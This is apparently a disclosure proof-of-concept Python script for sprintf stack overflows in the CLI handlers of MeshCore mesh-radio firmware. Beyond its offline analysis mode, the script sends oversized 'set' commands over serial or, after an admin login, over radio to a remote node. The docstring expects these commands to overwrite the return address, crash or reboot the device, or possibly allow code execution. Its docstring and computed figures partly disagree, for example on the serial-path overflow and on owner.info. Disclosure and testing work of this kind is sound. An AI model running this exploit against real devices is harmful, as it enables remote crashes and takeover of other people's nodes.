#!/usr/bin/env python3
"""
Bug #7 PoC — Unbounded sprintf Buffer Overflow in CLI Handler
==============================================================
Affected: CommonCLI::handleSetCmd()  (line ~729)  →  "unknown config: %s"
          CommonCLI::handleGetCmd()  (line ~890)  →  "??: %s"
          CommonCLI::handleGetCmd()  (line ~787)  →  owner.info char-by-char

Root cause
----------
All three CommonCLI handler functions receive a `char *reply` pointer to
a fixed-size buffer allocated by the caller.  The callers allocate:

  • Serial path  : char reply[160]   (simple_repeater, sensor, room_server)
  • BLE/Radio path: uint8_t temp[166] → reply = (char *)&temp[5]  →  161 bytes

Every sprintf() call in CommonCLI.cpp (~62 total) uses unbounded sprintf()
— there is not a single snprintf() in the entire file.

When an unrecognised config name is sent via `set <bogus>` or `get <bogus>`,
the full attacker-controlled config string is echoed back:

  handleSetCmd line 729:  sprintf(reply, "unknown config: %s", config);
  handleGetCmd line 890:  sprintf(reply, "??: %s", config);

The BLE/Radio path allows commands up to 179 bytes.  After "set " (4 bytes),
the config string can be up to 175 bytes.  "unknown config: " is 16 bytes,
so the total written = 16 + 175 = 191 bytes into a 161-byte buffer —
overflowing by 30 bytes, corrupting the stack frame (return address,
saved registers).

The `get owner.info` path writes _prefs->owner_info (up to 120 chars)
char-by-char with zero bounds checking.

Exploitation vector
-------------------
• Via serial: attacker needs physical access, command buffer is 160 bytes
  → limited to 140-byte config → "unknown config: " + 140 = 156 < 160 → tight
• Via BLE: attacker within BLE range, after pairing, sends CLI command
  with 170+ byte payload → guaranteed 30-byte stack overflow
• Via radio: remote attacker who knows admin password can send CLI packet
  with 170+ byte command → same overflow, fully remote

This script demonstrates the overflow via serial (send_cmd) and also
provides an analysis mode that requires no target device.

How to use
----------
1. Install meshcore_py:
     pip install meshcore

2. Analysis only (no device needed):
     python bug7-cli-overflow.py --analyze

3. Send overflow via serial CLI to a target (serial path, 160-byte buf):
     python bug7-cli-overflow.py -p COM3 --serial-overflow

4. Send overflow via remote CLI command to a contact (161-byte buf):
     python bug7-cli-overflow.py -p COM3 --dest <contact_name>

Replace COM3 with your serial port.
The contact must exist and be an admin on the target device.
"""

import asyncio
import argparse
import sys

try:
    from meshcore import MeshCore, EventType
except ImportError:
    sys.exit("meshcore package not found – pip install meshcore")


# ---------- protocol / buffer constants (must match firmware) ----------
MAX_PACKET_PAYLOAD      = 184
SERIAL_REPLY_BUF        = 160   # char reply[160] in main.cpp
REMOTE_REPLY_BUF        = 161   # uint8_t temp[166]; reply = &temp[5]
SERIAL_CMD_BUF          = 160   # char command[160] in main.cpp
REMOTE_CMD_MAX          = 179   # data[5..183] = 179 bytes
SET_PREFIX              = "set "     # 4 bytes
GET_PREFIX              = "get "     # 4 bytes
UNKNOWN_CONFIG_FMT_LEN  = len("unknown config: ")  # 16 bytes
UNKNOWN_GET_FMT_LEN     = len("??: ")               # 4 bytes
OWNER_INFO_MAX          = 120   # char owner_info[120] in NodePrefs


def analyze():
    """Print detailed overflow analysis for all three vulnerable code paths."""
    print("=" * 65)
    print("Bug #7 — sprintf Buffer Overflow Analysis")
    print("=" * 65)

    # --- Path 1: "set <bogus>" → "unknown config: %s" ---
    print("\n--- Path 1: handleSetCmd() line 729 ---")
    print('  sprintf(reply, "unknown config: %s", config);')
    print()

    # Serial
    serial_config_max = SERIAL_CMD_BUF - 1 - len(SET_PREFIX)  # 155
    serial_written = UNKNOWN_CONFIG_FMT_LEN + serial_config_max
    serial_overflow = serial_written - SERIAL_REPLY_BUF
    print(f"  Serial path:")
    print(f"    command buf  = {SERIAL_CMD_BUF}  →  config max = {serial_config_max} bytes")
    print(f"    sprintf writes {UNKNOWN_CONFIG_FMT_LEN} + {serial_config_max} = {serial_written} bytes")
    print(f"    reply buf    = {SERIAL_REPLY_BUF}")
    print(f"    overflow     = {serial_overflow} bytes  {'⚠ OVERFLOW' if serial_overflow > 0 else '(tight fit)'}")

    # Remote (BLE/Radio)
    remote_config_max = REMOTE_CMD_MAX - len(SET_PREFIX)  # 175
    remote_written = UNKNOWN_CONFIG_FMT_LEN + remote_config_max
    remote_overflow = remote_written - REMOTE_REPLY_BUF
    print(f"  Remote path (BLE/Radio):")
    print(f"    command max  = {REMOTE_CMD_MAX}  →  config max = {remote_config_max} bytes")
    print(f"    sprintf writes {UNKNOWN_CONFIG_FMT_LEN} + {remote_config_max} = {remote_written} bytes")
    print(f"    reply buf    = {REMOTE_REPLY_BUF}")
    print(f"    overflow     = {remote_overflow} bytes  {'⚠ OVERFLOW' if remote_overflow > 0 else 'SAFE'}")

    # --- Path 2: "get <bogus>" → "??: %s" ---
    print("\n--- Path 2: handleGetCmd() line 890 ---")
    print('  sprintf(reply, "??: %s", config);')
    print()

    serial_config_max_get = SERIAL_CMD_BUF - 1 - len(GET_PREFIX)
    serial_written_get = UNKNOWN_GET_FMT_LEN + serial_config_max_get
    serial_overflow_get = serial_written_get - SERIAL_REPLY_BUF
    print(f"  Serial path:")
    print(f"    config max   = {serial_config_max_get}")
    print(f"    sprintf writes {UNKNOWN_GET_FMT_LEN} + {serial_config_max_get} = {serial_written_get}")
    print(f"    overflow     = {serial_overflow_get} bytes  {'⚠ OVERFLOW' if serial_overflow_get > 0 else '(tight fit)'}")

    remote_config_max_get = REMOTE_CMD_MAX - len(GET_PREFIX)
    remote_written_get = UNKNOWN_GET_FMT_LEN + remote_config_max_get
    remote_overflow_get = remote_written_get - REMOTE_REPLY_BUF
    print(f"  Remote path:")
    print(f"    config max   = {remote_config_max_get}")
    print(f"    sprintf writes {UNKNOWN_GET_FMT_LEN} + {remote_config_max_get} = {remote_written_get}")
    print(f"    overflow     = {remote_overflow_get} bytes  {'⚠ OVERFLOW' if remote_overflow_get > 0 else 'SAFE'}")

    # --- Path 3: "get owner.info" → char-by-char ---
    print("\n--- Path 3: handleGetCmd() lines 787-794 ---")
    print('  *reply++ = \'>\';  *reply++ = \' \';')
    print('  while (*sp) { *reply++ = ...; sp++; }  // no bounds check')
    print()
    owner_total = 2 + OWNER_INFO_MAX  # "> " prefix + max owner_info
    print(f"  Max write = 2 (prefix) + {OWNER_INFO_MAX} (owner_info) = {owner_total} bytes")
    print(f"  Serial reply buf = {SERIAL_REPLY_BUF}  →  {'SAFE' if owner_total <= SERIAL_REPLY_BUF else '⚠ OVERFLOW by ' + str(owner_total - SERIAL_REPLY_BUF)}")
    print(f"  Remote reply buf = {REMOTE_REPLY_BUF}  →  {'SAFE' if owner_total <= REMOTE_REPLY_BUF else '⚠ OVERFLOW by ' + str(owner_total - REMOTE_REPLY_BUF)}")

    # --- Summary ---
    print("\n" + "=" * 65)
    print("SUMMARY")
    print("=" * 65)
    print(f"  handleSetCmd 'unknown config':  up to {remote_overflow}-byte overflow (remote)")
    print(f"  handleGetCmd '??':              up to {remote_overflow_get}-byte overflow (remote)")
    print(f"  handleGetCmd 'owner.info':      safe (max {owner_total} < {REMOTE_REPLY_BUF})")
    print(f"")
    print(f"  Total sprintf() calls in CommonCLI.cpp: ~62")
    print(f"  Total snprintf() calls:                  0")
    print(f"  → 100% unbounded string formatting")


async def serial_overflow_test(port: str, baud: int):
    """Send a long 'set' command via serial to trigger the overflow on device."""
    mc = await MeshCore.create_serial(port, baud, debug=False)
    if mc is None:
        sys.exit("Could not connect to device")

    try:
        # Serial command buffer is 160 bytes (including \r terminator).
        # We fill it with: "set " + "A" * 155 + \0
        # The firmware echoes: "unknown config: " (16) + "A"*155 = 171 bytes
        # Into reply[160] → overflow by 11 bytes.
        config_fill = SERIAL_CMD_BUF - 1 - len(SET_PREFIX)  # 155
        payload = SET_PREFIX + "A" * config_fill

        print(f"[*] Sending {len(payload)}-byte serial command: set {'A' * 20}...({'A' * 5})")
        print(f"[*] Firmware will sprintf {UNKNOWN_CONFIG_FMT_LEN} + {config_fill} = "
              f"{UNKNOWN_CONFIG_FMT_LEN + config_fill} bytes into {SERIAL_REPLY_BUF}-byte reply[]")
        overflow = UNKNOWN_CONFIG_FMT_LEN + config_fill - SERIAL_REPLY_BUF
        if overflow > 0:
            print(f"[!] Expected overflow: {overflow} bytes past reply buffer")
        else:
            print(f"[*] No overflow on serial path (reply buf large enough)")
        print(f"[*] Sending now...")

        # Write raw bytes to the serial port (bypassing the companion framing).
        # This hits the firmware's serial CLI parser directly.
        serial_cx = mc.connection_manager.connection
        serial_cx.transport.write((payload + "\r").encode("utf-8"))

        # Wait for response or crash
        await asyncio.sleep(2)

        print(f"[*] Command sent. If the device is still responding, check its")
        print(f"    serial output for garbled text or crash dump.")
        print(f"    On ARM Cortex-M (nRF52), a stack overflow may trigger a")
        print(f"    HardFault and reboot.")

    finally:
        await mc.disconnect()


async def remote_overflow_test(port: str, baud: int, dest_name: str, password: str):
    """Send a long CLI command via BLE/radio to a remote node (161-byte reply buf)."""
    mc = await MeshCore.create_serial(port, baud, debug=False)
    if mc is None:
        sys.exit("Could not connect to device")

    try:
        await mc.ensure_contacts()
        contact = mc.get_contact_by_name(dest_name)
        if not contact:
            sys.exit(f"Contact '{dest_name}' not found")

        # Must be logged in as admin for CLI commands to be accepted
        print(f"[*] Logging in to '{dest_name}'...")
        r = await mc.commands.send_login_sync(contact, password, min_timeout=15)
        if not r or r.type == EventType.ERROR:
            sys.exit(f"Login failed: {r}")
        print(f"[+] Login successful")

        # Remote CLI commands go through send_cmd → TXT_TYPE_CLI_DATA
        # The command is placed in data[5..] → up to 179 bytes
        # "set " = 4 bytes, leaving 175 for config string
        # "unknown config: " (16) + 175 = 191 bytes into 161-byte reply[]
        # → 30-byte overflow
        config_fill = REMOTE_CMD_MAX - len(SET_PREFIX)  # 175
        payload = SET_PREFIX + "B" * config_fill

        overflow = UNKNOWN_CONFIG_FMT_LEN + config_fill - REMOTE_REPLY_BUF
        print(f"[*] Sending {len(payload)}-byte remote CLI command to '{dest_name}'")
        print(f"[*] Target will sprintf {UNKNOWN_CONFIG_FMT_LEN} + {config_fill} = "
              f"{UNKNOWN_CONFIG_FMT_LEN + config_fill} bytes into {REMOTE_REPLY_BUF}-byte reply[]")
        print(f"[!] Expected overflow: {overflow} bytes past reply buffer")
        print(f"[*] On ARM Cortex-M4 (nRF52), this overwrites:")
        print(f"      - saved register r4-r7 on stack")
        print(f"      - return address (LR)")
        print(f"      → HardFault / reboot / possible code execution")
        print()
        print(f"[*] Sending now...")

        r = await mc.commands.send_cmd(contact, payload)
        print(f"[*] send_cmd result: {r.type.value}")
        print(f"[*] If the target device becomes unresponsive or reboots,")
        print(f"    the overflow was triggered successfully.")

    finally:
        await mc.disconnect()


async def main() -> None:
    ap = argparse.ArgumentParser(description="Bug #7 — CLI sprintf overflow PoC")
    ap.add_argument("-p", "--port", default=None, help="Serial port (e.g. COM3)")
    ap.add_argument("-b", "--baud", type=int, default=115200)
    ap.add_argument("--analyze", action="store_true",
                    help="Print overflow analysis (no device needed)")
    ap.add_argument("--serial-overflow", action="store_true",
                    help="Send overflow via serial CLI path")
    ap.add_argument("--dest", default=None,
                    help="Contact name for remote CLI overflow test")
    ap.add_argument("--pwd", default=None,
                    help="Admin password for remote login (required with --dest)")
    args = ap.parse_args()

    if args.analyze:
        analyze()
        return

    if not args.port:
        sys.exit("--port is required for device tests (or use --analyze)")

    if args.serial_overflow:
        await serial_overflow_test(args.port, args.baud)
    elif args.dest:
        if not args.pwd:
            sys.exit("--pwd is required with --dest (admin login needed for CLI commands)")
        await remote_overflow_test(args.port, args.baud, args.dest, args.pwd)
    else:
        print("Specify --analyze, --serial-overflow, or --dest <contact>")
        analyze()


if __name__ == "__main__":
    asyncio.run(main())
